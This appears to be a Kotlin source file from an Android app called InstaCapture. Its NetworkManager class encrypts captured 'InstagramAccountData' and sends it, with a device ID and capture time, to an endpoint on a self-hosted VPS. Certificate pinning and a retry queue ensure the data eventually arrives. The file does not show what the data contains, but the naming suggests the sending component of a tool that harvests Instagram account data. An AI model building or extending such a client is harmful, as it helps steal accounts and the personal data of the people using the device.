package com.instacapture

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import com.google.gson.Gson
import okhttp3.CertificatePinner
import okhttp3.ConnectionSpec
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.TlsVersion
import java.io.IOException
import java.util.concurrent.TimeUnit

/**
 * NetworkManager — сетевая отправка данных с certificate pinning и offline-очередью.
 * Обязанности:
 * - Проверка доступности сети
 * - Certificate Pinning (защита от MITM)
 * - Шифрование payload перед отправкой
 * - Offline-режим: сохранение в QueueManager при ошибке
 */
class NetworkManager(context: Context) {

    companion object {
        private const val TAG = "InstaCapture:Network"
        private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()
    }

    private val gson = Gson()
    private val crypto = CryptoManager()
    private val queue = QueueManager(context)
    private val connectivityManager =
        context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

    /**
     * OkHttp с TLS 1.3 и Certificate Pinning.
     * TODO: Обязательно замените PINNED_CERTIFICATE_HASH в Config.kt на реальный
     *        SHA-256 хеш вашего SSL-сертификата.
     */
    private val certificatePinner = CertificatePinner.Builder()
        .add("your-vps.com", Config.PINNED_CERTIFICATE_HASH)
        // TODO: Добавьте дополнительные backup-пины для ротации сертификатов
        .build()

    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(Config.CONNECT_TIMEOUT_MS, TimeUnit.MILLISECONDS)
        .readTimeout(Config.READ_TIMEOUT_MS, TimeUnit.MILLISECONDS)
        .certificatePinner(certificatePinner)
        .connectionSpecs(
            listOf(
                ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS)
                    .tlsVersions(TlsVersion.TLS_1_3, TlsVersion.TLS_1_2)
                    .build()
            )
        )
        .build()

    /**
     * Отправить данные на сервер.
     * Порядок действий:
     * 1. Сериализовать в JSON
     * 2. Зашифровать через CryptoManager (AES-256-GCM + Keystore)
     * 3. Отправить POST с заголовком X-API-Key
     * 4. При ошибке — сохранить в локальную очередь
     */
    fun sendData(data: InstagramAccountData, callback: (Boolean, String?) -> Unit) {
        if (!isNetworkAvailable()) {
            val payload = preparePayload(data)
            queue.enqueue(payload)
            callback(false, "Нет сети — данные сохранены в очередь")
            return
        }

        val json = gson.toJson(data)
        val encrypted = crypto.encrypt(json)

        val body = """
            {
                "payload": "$encrypted",
                "device_id": "${data.deviceId}",
                "captured_at": ${data.capturedAt}
            }
        """.trimIndent().toRequestBody(JSON_MEDIA)

        val request = Request.Builder()
            .url(Config.CAPTURE_ENDPOINT)
            .post(body)
            .header("X-API-Key", Config.API_KEY)
            .header("Content-Type", "application/json")
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    Log.i(TAG, "Данные успешно отправлены: $responseBody")
                    callback(true, null)
                } else {
                    val error = "HTTP ${response.code}: ${response.message}"
                    Log.e(TAG, error)
                    // Сохраняем в очередь для повторной попытки
                    val payload = preparePayload(data)
                    queue.enqueue(payload)
                    callback(false, error)
                }
            }
        } catch (e: IOException) {
            val msg = "Ошибка сети: ${e.message}"
            Log.e(TAG, msg, e)
            val payload = preparePayload(data)
            queue.enqueue(payload)
            callback(false, msg)
        }
    }

    /**
     * Тестовое соединение с сервером (проверка доступности).
     * Используется из UI — кнопка "Тестовое соединение".
     */
    fun testConnection(callback: (Boolean, String) -> Unit) {
        if (!isNetworkAvailable()) {
            callback(false, "Нет подключения к интернету")
            return
        }

        val request = Request.Builder()
            .url("${Config.SERVER_URL}/api/health")
            .header("X-API-Key", Config.API_KEY)
            .build()

        try {
            client.newCall(request).execute().use { response ->
                if (response.isSuccessful) {
                    callback(true, "Сервер доступен (HTTP ${response.code})")
                } else {
                    callback(false, "Ошибка сервера: HTTP ${response.code}")
                }
            }
        } catch (e: IOException) {
            callback(false, "Не удалось соединиться: ${e.message}")
        }
    }

    /**
     * Фоновая синхронизация очереди.
     * Вызывается при появлении сети или по расписанию (WorkManager).
     */
    fun syncQueue() {
        val pending = queue.getAllPending()
        if (pending.isEmpty()) {
            if (Config.DEBUG_MODE) Log.d(TAG, "Очередь пуста")
            return
        }

        Log.i(TAG, "Синхронизация очереди: ${pending.size} записей")

        for (entry in pending) {
            val body = """
                {
                    "payload": "${entry.encryptedPayload}",
                    "device_id": "unknown",
                    "captured_at": ${entry.createdAt}
                }
            """.trimIndent().toRequestBody(JSON_MEDIA)

            val request = Request.Builder()
                .url(Config.CAPTURE_ENDPOINT)
                .post(body)
                .header("X-API-Key", Config.API_KEY)
                .build()

            try {
                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        queue.remove(entry.id)
                        if (Config.DEBUG_MODE) Log.d(TAG, "Запись ${entry.id} синхронизирована")
                    } else {
                        queue.incrementRetry(entry.id, "HTTP ${response.code}")
                    }
                }
            } catch (e: IOException) {
                queue.incrementRetry(entry.id, e.message ?: "IOException")
            }
        }
    }

    private fun isNetworkAvailable(): Boolean {
        val network = connectivityManager.activeNetwork ?: return false
        val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun preparePayload(data: InstagramAccountData): String {
        val json = gson.toJson(data)
        return crypto.encrypt(json)
    }
}
